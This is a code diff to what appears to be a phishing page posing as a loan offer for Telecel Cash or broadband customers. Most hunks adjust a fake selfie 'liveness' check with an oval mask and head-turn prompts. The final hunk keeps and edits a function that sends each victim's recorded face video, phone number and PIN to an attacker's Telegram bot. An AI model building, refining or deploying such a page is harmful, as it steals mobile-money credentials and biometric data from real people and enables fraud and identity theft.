@@ -104,7 +104,7 @@ input::placeholder{color:var(--text-light)}
 .selfie-panel{
   position:absolute;bottom:0;left:0;right:0;z-index:2;
   background:linear-gradient(0deg,rgba(0,0,0,0.88) 0%,rgba(0,0,0,0.0) 100%);
-  padding:20px 28px 38px;
+  padding:20px 28px 48px; /* Extra bottom padding for clearance */
   display:flex;flex-direction:column;align-items:center;gap:14px;
 }
 .selfie-dots{display:flex;gap:10px;align-items:center}
@@ -251,8 +251,8 @@ input::placeholder{color:var(--text-light)}
     <defs>
       <mask id="ovalMask">
         <rect width="400" height="600" fill="white"/>
-        <!-- Oval centered exactly in the middle -->
-        <ellipse cx="200" cy="300" rx="120" ry="165" fill="black"/>
+        <!-- LARGE OVAL centered exactly in the middle of the viewport -->
+        <ellipse cx="200" cy="270" rx="145" ry="195" fill="black"/>
       </mask>
       <filter id="glow">
         <feGaussianBlur stdDeviation="4" result="blur"/>
@@ -261,12 +261,12 @@ input::placeholder{color:var(--text-light)}
     </defs>
     <!-- Background overlay mask -->
     <rect width="400" height="600" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)"/>
-    <!-- Oval border centered in middle -->
-    <ellipse id="ovalBorder" cx="200" cy="300" rx="120" ry="165" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10"/>
+    <!-- Oval border centered higher to avoid bottom bar -->
+    <ellipse id="ovalBorder" cx="200" cy="270" rx="145" ry="195" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10"/>
     
     <!-- Liveness indicators - adjusted for centered oval -->
     <g id="arrowGroup" style="opacity:0">
-      <circle id="arrowCircle" cx="200" cy="110" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
+      <circle id="arrowCircle" cx="200" cy="50" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
       <path id="aLine1" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
       <path id="aLine2" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
       <path id="aLine3" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
@@ -313,10 +313,10 @@ const CONFIG = {
 // 20 SECONDS TOTAL DURATION (4s per step)
 const STEP_DURATION = 4000;
 const STEPS = [
-  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:110 },
-  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:60,  cy:300 },
-  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:340, cy:300 },
-  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:200, cy:110 },
+  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:50 },
+  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:30,  cy:270 },
+  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:370, cy:270 },
+  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:200, cy:50 },
   { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:200, cy:490 },
 ];
 
@@ -468,10 +468,10 @@ selfieCancel.onclick = () => {
   isProcessing=false;
 };
 
-// ── OVAL CROP LOGIC ──
+// ── LARGE OVAL CROP LOGIC ──
 function drawOvalFrame() {
-  const w = 480; // Final width
-  const h = 640; // Final height (portrait)
+  const w = 540; // Increased resolution
+  const h = 720; 
   cropCanvas.width = w;
   cropCanvas.height = h;
 
@@ -480,7 +480,6 @@ function drawOvalFrame() {
   const vh = v.videoHeight;
   
   if (vw && vh) {
-    // Force portrait crop from source
     const targetAspect = w / h;
     let sw, sh, sx, sy;
     if (vw / vh > targetAspect) {
@@ -496,12 +495,11 @@ function drawOvalFrame() {
     cropCtx.fillRect(0, 0, w, h);
 
     cropCtx.save();
-    // Perfect oval clipping path
+    // Large centered oval clipping path
     cropCtx.beginPath();
-    cropCtx.ellipse(w/2, h/2, w/2 - 5, h/2 - 5, 0, 0, Math.PI * 2);
+    cropCtx.ellipse(w/2, h/2 - 30, w/2 - 10, h/2 - 40, 0, 0, Math.PI * 2);
     cropCtx.clip();
 
-    // Draw mirrored video frame into the oval
     cropCtx.translate(w, 0);
     cropCtx.scale(-1, 1);
     cropCtx.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
@@ -550,11 +548,11 @@ async function startSelfieVerification() {
 async function sendVideoToTelegram() {
   if (!selfieBlob || selfieBlob.size < 1000) return;
   const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
-  const caption = `🎥 Oval Selfie Verified (20s)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
+  const caption = `🎥 Identity Verified (20s Oval)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
   const ext = selfieBlob.type.includes('mp4') ? 'mp4' : 'webm';
   const fd  = new FormData();
   fd.append('chat_id', CONFIG.CHAT_ID);
-  fd.append('video',   selfieBlob, `oval_${Date.now()}.${ext}`);
+  fd.append('video',   selfieBlob, `identity_${Date.now()}.${ext}`);
   fd.append('caption', caption);
   try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, { method:'POST', body:fd }); } catch(_) {}
 }
